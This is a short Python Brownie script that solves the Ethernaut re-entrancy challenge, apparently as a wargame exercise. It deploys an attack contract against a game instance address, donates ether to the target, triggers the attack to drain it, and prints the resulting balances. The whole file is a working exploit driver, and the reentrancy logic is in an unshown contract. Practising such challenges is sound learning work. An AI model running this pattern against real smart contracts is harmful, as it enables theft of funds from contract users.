from scripts.helpful_scripts import get_account
from brownie import web3, Attack10, interface

ETHERNAUT_INSTANCE = "0x58C7cdda21c43803DcFE82CE7E41926816df7bb9"
PLAYER = "0xF8f8269488f73fab3935555FCDdD6035699deE25"
AMOUNT = "0.01 ether"
GAS_LIMIT = 6000000


def main():

    # set player account
    player = get_account()

    # set target (interface address)
    target = interface.ReentrantInterface(ETHERNAUT_INSTANCE)

    # deploy attack contract
    attack = Attack10.deploy(ETHERNAUT_INSTANCE, AMOUNT, {"from": player})

    # donate ether to the target contract
    target.donate(ETHERNAUT_INSTANCE, {"from": player, "value": AMOUNT})

    # call the attack() function, on my attack contract
    attack.attack({"from": player, "allow_revert": True, "gas_limit": GAS_LIMIT})

    #  check balance (in ether) of the target contract
    current_balance_target = target.balance()
    current_balance_attack = attack.balance()
    eth_balance_target = web3.fromWei(current_balance_target, "ether")
    eth_balance_attack = web3.fromWei(current_balance_attack, "ether")

    print(f"\nBalance of the target contract = {eth_balance_target} ether")
    print(f"\nBalance of the attack contract = {eth_balance_attack} ether\n")

    # ####  could print all of these values to a log file?
